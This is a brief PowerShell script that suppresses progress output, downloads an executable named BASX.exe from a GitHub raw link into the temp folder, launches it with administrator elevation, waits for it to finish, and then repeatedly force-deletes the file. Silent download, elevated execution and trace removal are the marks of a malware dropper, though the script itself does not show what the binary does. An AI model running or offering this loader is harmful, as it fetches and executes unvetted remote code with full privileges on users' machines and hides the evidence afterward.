$ProgressPreference = 'SilentlyContinue'
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"

Invoke-WebRequest -Uri $url -OutFile $output

$process = Start-Process -FilePath $output -Verb RunAs -PassThru
$process | Wait-Process

Start-Sleep -Seconds 2

while (Test-Path $output) {
    Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
    if (Test-Path $output) { Start-Sleep -Seconds 1 }
}

exit
